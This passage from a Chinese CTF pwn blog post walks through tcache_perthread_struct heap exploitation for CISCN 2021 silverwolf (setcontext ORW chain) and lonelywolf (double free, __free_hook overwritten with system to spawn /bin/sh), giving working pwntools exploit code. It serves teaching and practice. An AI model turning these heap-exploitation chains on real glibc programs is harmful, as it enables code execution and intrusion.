+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x20 free_hook--&gt;setcontext</span><br><span class="line">0x40 存储flag</span><br><span class="line">0x50 调用free</span><br><span class="line">0x60 跳转至orw</span><br><span class="line">0x70 orw的前半部分（因为size只有0x60）</span><br><span class="line">0x80 orw的后半部分</span><br></pre></td></tr></table></figure>
+<h3 id="orw链getshell"><a class="markdownIt-Anchor" href="#orw链getshell"></a> ORW链+getshell</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode = p64(rdi) + p64(flag_addr) + p64(rsi) + p64(<span class="number">0</span>) + p64(rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">shellcode += p64(rdi) + p64(<span class="number">3</span>) + p64(rsi) + p64(orw1) + p64(rdx) + p64(<span class="number">0x100</span>) + p64(read)</span><br><span class="line">shellcode += p64(rdi) + p64(<span class="number">1</span>) + p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#free_hook</span></span><br><span class="line">edit(p64(mov_rsp_rdi_a0))</span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#edit flag</span></span><br><span class="line">edit(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#orw1</span></span><br><span class="line">edit(shellcode[:<span class="number">0x60</span>]) <span class="comment">#the place near the beginning orw</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#orw2</span></span><br><span class="line">edit(shellcode[<span class="number">0x60</span>:]) <span class="comment">#the place near the end orw</span></span><br><span class="line">add(<span class="number">0x58</span>) <span class="comment">#fake2</span></span><br><span class="line">edit(p64(orw1) + p64(ret))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#fake1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>来让我们跟着动调一步一步看效果<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111123839-2019308764.png" alt="image" /><br />
+free的时候会调用<code>setcontext+0x53</code>，原理和__malloc_hook是差不多的，我们再跟进<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111228035-1803931608.png" alt="image" /><br />
+第一步会把我们<strong>储存在rdi + 0xa0的地址处的值取出来赋给rsp</strong>，也<strong>就会把我们的rsp迁到我们布置好的恶意ROP链上</strong><br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111327154-1705991264.png" alt="image" /><br />
+继续跟进可以看到我们就开始执行ROP链了<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111439915-1477585456.png" alt="image" /><br />
+到这就结束啦，就可以获得flag了</p>
+<h1 id="例题2ciscn-2021-初赛lonelywolf劫持free_hook"><a class="markdownIt-Anchor" href="#例题2ciscn-2021-初赛lonelywolf劫持free_hook"></a> 例题②[CISCN 2021 初赛]lonelywolf（劫持free_hook）</h1>
+<p>这个题跟silverwolf其实区别不大，就是没有开sandbox让我们有这种常规方式进行攻击</p>
+<h2 id="checksec-2"><a class="markdownIt-Anchor" href="#checksec-2"></a> checksec</h2>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211226346-42078125.png" alt="image" /></p>
+<h2 id="源审-2"><a class="markdownIt-Anchor" href="#源审-2"></a> 源审</h2>
+<p>它原本还开了去符号表，我这边把它修改成了对应函数<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211245943-1568004840.png" alt="image" /></p>
+<h3 id="add-2"><a class="markdownIt-Anchor" href="#add-2"></a> add</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211328962-903329788.png" alt="image" /></p>
+<h3 id="show-2"><a class="markdownIt-Anchor" href="#show-2"></a> show</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211348558-1988703103.png" alt="image" /></p>
+<h3 id="edit-2"><a class="markdownIt-Anchor" href="#edit-2"></a> edit</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211407039-1374223032.png" alt="image" /></p>
+<h3 id="delete-2"><a class="markdownIt-Anchor" href="#delete-2"></a> delete</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211421920-1113325612.png" alt="image" /><br />
+可以看到，这些函数和silverwolf是没有区别的，仅仅只是攻击方式的区别</p>
+<h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./lonelywolf&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28775)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete()</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">2</span>) <span class="comment">#消除key（一种保护措施），使我们能double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x260</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(p64(heap_base + <span class="number">0x10</span>)) <span class="comment">#劫持tcache_perthread_struct</span></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#edit(b&#x27;\x00&#x27; * 0x35 + b&#x27;\x07&#x27;)</span></span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x23</span> + <span class="string">b&#x27;\x07&#x27;</span>) <span class="comment">#伪造counts数组，让它误以为0x250的堆块已经free了7个</span></span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook==&gt;&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook) <span class="comment">#赛方提供的libc是错误的，正确版本应该是2.27-3ubuntu1.4_amd64，如果不知道，就用LibcSearcher</span></span><br><span class="line">libc_base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="string">b&#x27;\x01\x01&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x3e</span> + p64(free_hook) + p64(heap_base + <span class="number">0x260</span>)) <span class="comment">#伪造counts数组让它以为0x10和0x20各释放了一个堆块，分别往这两个堆块上布置free和存放/bin/sh\x00的地方</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(system)) <span class="comment">#free-&gt;system</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#存放/bin/sh\x00</span></span><br><span class="line"></span><br><span class="line">delete() <span class="comment">#rdi寻址是add(0x20)的地址，相当于system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h1>
+<p>利用tcache_perthread_struct的时候需要精确计算各个地址，步步为营，但如果熟练了就知道大概什么个方式了，很快就能写出来了。不过刚学的时候确实会一个头比两个大，<strong>纸上得来终觉浅 绝知此事要躬行</strong>，多动调几次就会好理解很多，<strong>所以说为什么动调是神！</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Heap/" rel="tag">Heap</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://s2.loli.net/2024/12/02/u9D7JI4F1TZHOqB.jpg" data-sizes="auto" alt="劫持_IO_file_jumps&amp;environ" class="lazyload">
+          
+        
+        <a href="/2024/05/11/%E5%8A%AB%E6%8C%81_IO_file_jumps%E6%94%BB%E5%87%BB%E5%92%8Cenviron%E6%94%BB%E5%87%BB/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            劫持_IO_file_jumps&amp;environ
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/11/29/BWUfxhRNo2eOdq5.png" data-sizes="auto" alt="劫持__malloc_hook" class="lazyload">
+        
+      
+      <a href="/2024/04/23/%E5%8A%AB%E6%8C%81_malloc_hook(%E5%8A%A0%E5%85%A5tcache_bins%E5%90%8E)/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          劫持__malloc_hook
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%E5%8F%AF%E5%BF%BD%E7%95%A5"><span class="toc-number">1.</span> <span class="toc-text"> 前言（可忽略）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache_perthread_struct%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text"> tcache_perthread_struct的结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text"> 源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#counts%E6%95%B0%E7%BB%84"><span class="toc-number">2.2.</span> <span class="toc-text"> counts数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#entry%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text"> entry指针数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F"><span class="toc-number">2.4.</span> <span class="toc-text"> 大小</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text"> 攻击方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981ciscn-2021-%E5%88%9D%E8%B5%9Bsilverwolfsetcontextorw"><span class="toc-number">3.</span> <span class="toc-text"> 例题①[CISCN 2021 初赛]silverwolf（setcontext+orw）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">3.1.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E5%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text"> 源审</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-number">3.2.1.</span> <span class="toc-text"> main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add"><span class="toc-number">3.2.2.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">3.2.3.</span> <span class="toc-text"> edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show"><span class="toc-number">3.2.4.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">3.2.5.</span> <span class="toc-text"> delete</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.6.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text"> 动调过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2heap_base"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 泄露heap_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc_base"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 泄露libc_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache_bins%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.3.</span> <span class="toc-text"> tcache_bins构造恶意地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A5%E9%98%B6%E6%AE%B5payload"><span class="toc-number">3.3.3.1.</span> <span class="toc-text"> 该阶段Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setcontext"><span class="toc-number">3.3.3.2.</span> <span class="toc-text"> setcontext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83"><span class="toc-number">3.3.3.3.</span> <span class="toc-text"> 动调</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#orw%E9%93%BEgetshell"><span class="toc-number">3.3.4.</span> <span class="toc-text"> ORW链+getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982ciscn-2021-%E5%88%9D%E8%B5%9Blonelywolf%E5%8A%AB%E6%8C%81free_hook"><span class="toc-number">4.</span> <span class="toc-text"> 例题②[CISCN 2021 初赛]lonelywolf（劫持free_hook）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec-2"><span class="toc-number">4.1.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E5%AE%A1-2"><span class="toc-number">4.2.</span> <span class="toc-text"> 源审</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#add-2"><span class="toc-number">4.2.1.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-2"><span class="toc-number">4.2.2.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-2"><span class="toc-number">4.2.3.</span> <span class="toc-text"> edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-2"><span class="toc-number">4.2.4.</span> <span class="toc-text"> delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.3.</span> <span class="toc-text"> Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">5.</span> <span class="toc-text"> 总结</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        38.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:45
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%E5%8F%AF%E5%BF%BD%E7%95%A5"><span class="toc-number">1.</span> <span class="toc-text"> 前言（可忽略）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache_perthread_struct%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text"> tcache_perthread_struct的结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text"> 源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#counts%E6%95%B0%E7%BB%84"><span class="toc-number">2.2.</span> <span class="toc-text"> counts数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#entry%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text"> entry指针数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F"><span class="toc-number">2.4.</span> <span class="toc-text"> 大小</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text"> 攻击方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981ciscn-2021-%E5%88%9D%E8%B5%9Bsilverwolfsetcontextorw"><span class="toc-number">3.</span> <span class="toc-text"> 例题①[CISCN 2021 初赛]silverwolf（setcontext+orw）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">3.1.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E5%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text"> 源审</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-number">3.2.1.</span> <span class="toc-text"> main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add"><span class="toc-number">3.2.2.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">3.2.3.</span> <span class="toc-text"> edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show"><span class="toc-number">3.2.4.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">3.2.5.</span> <span class="toc-text"> delete</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.6.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text"> 动调过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2heap_base"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 泄露heap_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc_base"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 泄露libc_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache_bins%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.3.</span> <span class="toc-text"> tcache_bins构造恶意地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A5%E9%98%B6%E6%AE%B5payload"><span class="toc-number">3.3.3.1.</span> <span class="toc-text"> 该阶段Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setcontext"><span class="toc-number">3.3.3.2.</span> <span class="toc-text"> setcontext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83"><span class="toc-number">3.3.3.3.</span> <span class="toc-text"> 动调</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#orw%E9%93%BEgetshell"><span class="toc-number">3.3.4.</span> <span class="toc-text"> ORW链+getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982ciscn-2021-%E5%88%9D%E8%B5%9Blonelywolf%E5%8A%AB%E6%8C%81free_hook"><span class="toc-number">4.</span> <span class="toc-text"> 例题②[CISCN 2021 初赛]lonelywolf（劫持free_hook）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec-2"><span class="toc-number">4.1.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E5%AE%A1-2"><span class="toc-number">4.2.</span> <span class="toc-text"> 源审</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#add-2"><span class="toc-number">4.2.1.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-2"><span class="toc-number">4.2.2.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-2"><span class="toc-number">4.2.3.</span> <span class="toc-text"> edit</span></a></li><li class="toc-item 